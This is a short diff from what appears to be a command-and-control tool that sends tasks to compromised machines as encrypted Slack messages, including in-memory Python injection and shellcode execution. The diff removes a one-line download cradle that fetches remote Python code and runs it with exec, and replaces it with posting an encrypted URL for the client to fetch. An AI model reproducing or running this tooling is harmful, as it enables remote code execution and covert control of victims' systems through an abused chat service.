@@ -566,7 +566,7 @@ def shellcode(bearer, commands, client_id, filepath):  # Function execute shellc
 
 
 def pyinject(bearer, commands, client_id, filepath):  # Function execute python in memory
-    type = "command"
+    type = "pyinject"
     if '\\' in filepath:
         filename = (filepath.rsplit('\\', 1)[1])
     elif '/' in filepath:
@@ -592,9 +592,8 @@ def pyinject(bearer, commands, client_id, filepath):  # Function execute python 
     headers = {'Authorization': 'Bearer ' + bearer}
     aes_encrypt = AES_ENCRYPT()
     print(url)
-    cradle = "python -c \\'import urllib2;r=urllib2.urlopen(\"" + url + "\");exec(r.read())\\'"
-    command = aes_encrypt.encrypt(cradle)
-    data = {"channel": commands, "text": prefix + command}
+    url = aes_encrypt.encrypt(url)
+    data = {"channel": commands, "text": prefix + url}
     r = requests.post('https://slack.com/api/chat.postMessage', headers=headers, data=data)
 
 
